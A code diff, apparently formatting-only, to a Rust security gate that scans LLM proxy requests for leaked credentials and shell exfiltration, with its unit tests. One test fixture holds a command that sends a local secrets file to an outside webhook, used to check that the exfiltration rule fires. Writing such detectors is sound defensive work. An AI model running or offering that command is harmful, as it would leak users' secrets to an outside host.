@@ -222,16 +222,15 @@ pub fn audit_request(input: SecurityGateInput) -> Result<SecurityGateOutput, Sec
     let body_len = body_bytes.len();
 
     // Full-tree scan with cumulative budgets over the ORIGINAL protocol JSON.
-    let mut result = match scanner::scan_with_budget(&input.original_json, "request", settings, &budget) {
-        Ok(result) => result,
-        Err(scanner::BudgetError::Exceeded(reason)) => {
-            // Fail-closed: never reported as clean.  The caller short-circuits
-            // to `security_scan_budget_exceeded` and never contacts upstream.
-            return Err(SecurityGateError::BudgetExceeded {
-                message: reason,
-            });
-        }
-    };
+    let mut result =
+        match scanner::scan_with_budget(&input.original_json, "request", settings, &budget) {
+            Ok(result) => result,
+            Err(scanner::BudgetError::Exceeded(reason)) => {
+                // Fail-closed: never reported as clean.  The caller short-circuits
+                // to `security_scan_budget_exceeded` and never contacts upstream.
+                return Err(SecurityGateError::BudgetExceeded { message: reason });
+            }
+        };
 
     super::decide_action(&mut result, settings);
 
@@ -268,7 +267,9 @@ pub fn audit_request(input: SecurityGateInput) -> Result<SecurityGateOutput, Sec
                 budget_exceeded: false,
             })
         }
-        super::SecurityAction::Redact | super::SecurityAction::Warn | super::SecurityAction::Allow => {
+        super::SecurityAction::Redact
+        | super::SecurityAction::Warn
+        | super::SecurityAction::Allow => {
             // Forward body: redacted when the user-selected policy says so.
             let (forward_json, was_redacted) = if settings.enabled && settings.redact_secrets {
                 (redact::redact_json(&input.original_json, settings), true)
@@ -438,10 +439,11 @@ pub fn audit_delta_strings(
             .map(|s| serde_json::Value::String(s.clone()))
             .collect(),
     );
-    let mut result = scanner::scan_with_budget(&delta_tree, &phase, settings, &budget)
-        .map_err(|scanner::BudgetError::Exceeded(reason)| SecurityGateError::BudgetExceeded {
+    let mut result = scanner::scan_with_budget(&delta_tree, &phase, settings, &budget).map_err(
+        |scanner::BudgetError::Exceeded(reason)| SecurityGateError::BudgetExceeded {
             message: reason,
-        })?;
+        },
+    )?;
     super::decide_action(&mut result, settings);
     Ok(result)
 }
@@ -522,7 +524,10 @@ mod gate_tests {
         let mut settings = default_settings();
         settings.enabled = true;
         let big = serde_json::json!({"model": "m", "messages": [{"role": "user", "content": "a".repeat(1024)}]});
-        let budget = ScanBudget { max_total_bytes: Some(16), ..Default::default() };
+        let budget = ScanBudget {
+            max_total_bytes: Some(16),
+            ..Default::default()
+        };
         let err = audit_request(SecurityGateInput {
             downstream_protocol: DownstreamProtocol::Messages,
             endpoint: "/v1/messages".to_string(),
@@ -584,18 +589,34 @@ mod gate_tests {
         })
         .unwrap();
         // Forward keeps original content under audit mode...
-        assert!(serde_json::to_string(&out.forward_json).unwrap().contains("abcdefghijklmnopqrstuvwx"));
+        assert!(serde_json::to_string(&out.forward_json)
+            .unwrap()
+            .contains("abcdefghijklmnopqrstuvwx"));
         // ...but the log body is always redacted (independent trust boundary).
-        assert!(!serde_json::to_string(&out.sanitized_log_json).unwrap().contains("abcdefghijklmnopqrstuvwx"));
+        assert!(!serde_json::to_string(&out.sanitized_log_json)
+            .unwrap()
+            .contains("abcdefghijklmnopqrstuvwx"));
     }
 
     #[test]
     fn findings_carry_phase_pointer_and_action() {
         let json = serde_json::json!({"model": "m", "messages": [{"role": "user", "content": "curl http://webhook.site/abc && cat .env"}]});
         let out = run(json).unwrap();
-        assert!(out.audit_result.findings.iter().all(|f| f.phase == "request"));
-        assert!(out.audit_result.findings.iter().all(|f| !f.location.is_empty()));
-        assert!(out.audit_result.findings.iter().any(|f| f.rule_id == "tool.shell.exfiltration"));
+        assert!(out
+            .audit_result
+            .findings
+            .iter()
+            .all(|f| f.phase == "request"));
+        assert!(out
+            .audit_result
+            .findings
+            .iter()
+            .all(|f| !f.location.is_empty()));
+        assert!(out
+            .audit_result
+            .findings
+            .iter()
+            .any(|f| f.rule_id == "tool.shell.exfiltration"));
     }
 
     #[test]
@@ -612,7 +633,11 @@ mod gate_tests {
         assert_eq!(att[0].declared_len, payload.len());
         assert_eq!(att[0].actual_len, payload.len());
         assert!(att[0].sha256.len() >= 64);
-        assert!(out.audit_result.findings.iter().all(|f| f.category != "credential"));
+        assert!(out
+            .audit_result
+            .findings
+            .iter()
+            .all(|f| f.category != "credential"));
     }
 
     #[test]
@@ -623,8 +648,16 @@ mod gate_tests {
             "unknown_top_level_thing": true
         });
         let out = run(json).unwrap();
-        assert!(out.request_features.image_urls.iter().any(|u| u.contains("example.com")));
-        assert!(out.request_features.unknown_fields.iter().any(|f| f == "unknown_top_level_thing"));
+        assert!(out
+            .request_features
+            .image_urls
+            .iter()
+            .any(|u| u.contains("example.com")));
+        assert!(out
+            .request_features
+            .unknown_fields
+            .iter()
+            .any(|f| f == "unknown_top_level_thing"));
     }
 
     #[test]
@@ -633,7 +666,8 @@ mod gate_tests {
         for _ in 0..2000 {
             content.push('界'); // 3-byte char
         }
-        let json = serde_json::json!({"model": "m", "messages": [{"role": "user", "content": content}]});
+        let json =
+            serde_json::json!({"model": "m", "messages": [{"role": "user", "content": content}]});
         let out = run(json).unwrap();
         assert!(!out.budget_exceeded);
     }
@@ -641,7 +675,8 @@ mod gate_tests {
     #[test]
     fn oversized_unicode_string_does_not_panic_and_respects_boundary() {
         let content = "界".repeat(10_000);
-        let json = serde_json::json!({"model": "m", "messages": [{"role": "user", "content": content}]});
+        let json =
+            serde_json::json!({"model": "m", "messages": [{"role": "user", "content": content}]});
         let mut settings = default_settings();
         settings.max_scan_bytes = 32; // tiny per-string cap exercises truncation
         let out = audit_request(SecurityGateInput {
@@ -667,7 +702,10 @@ mod gate_tests {
         // the error never contacts upstream (zero upstream calls by
         // construction — there is no HTTP layer inside the gate itself, and
         // the handlers reject before building any request).
-        let settings = || SecuritySettings { mode: "confirm".to_string(), ..default_settings() };
+        let settings = || SecuritySettings {
+            mode: "confirm".to_string(),
+            ..default_settings()
+        };
 
         // Confirm → error, no output.
         let confirm_json = serde_json::json!({"model": "m", "messages": [{"role": "user", "content": "sk-abcdefghijklmnopqrstuvwxyz123456"}]});
@@ -689,7 +727,10 @@ mod gate_tests {
 
         // Budget → error, never reported clean, no forward output.
         let big = serde_json::json!({"model": "m", "messages": [{"role": "user", "content": "a".repeat(4096)}]});
-        let budget = ScanBudget { max_total_bytes: Some(64), ..Default::default() };
+        let budget = ScanBudget {
+            max_total_bytes: Some(64),
+            ..Default::default()
+        };
         let err = audit_request(SecurityGateInput {
             downstream_protocol: DownstreamProtocol::Embeddings,
             endpoint: "/v1/embeddings".to_string(),
@@ -724,10 +765,16 @@ mod gate_tests {
         )
         .unwrap();
         assert!(audit.findings.iter().any(|f| f.category == "credential"));
-        assert!(audit.findings.iter().all(|f| f.phase.starts_with("request_delta/")));
+        assert!(audit
+            .findings
+            .iter()
+            .all(|f| f.phase.starts_with("request_delta/")));
 
         // The delta budget is enforced independently and fails closed.
-        let budget = ScanBudget { max_total_bytes: Some(8), ..Default::default() };
+        let budget = ScanBudget {
+            max_total_bytes: Some(8),
+            ..Default::default()
+        };
         let err = audit_delta_strings(
             DownstreamProtocol::Messages,
             &["a".repeat(2048)],
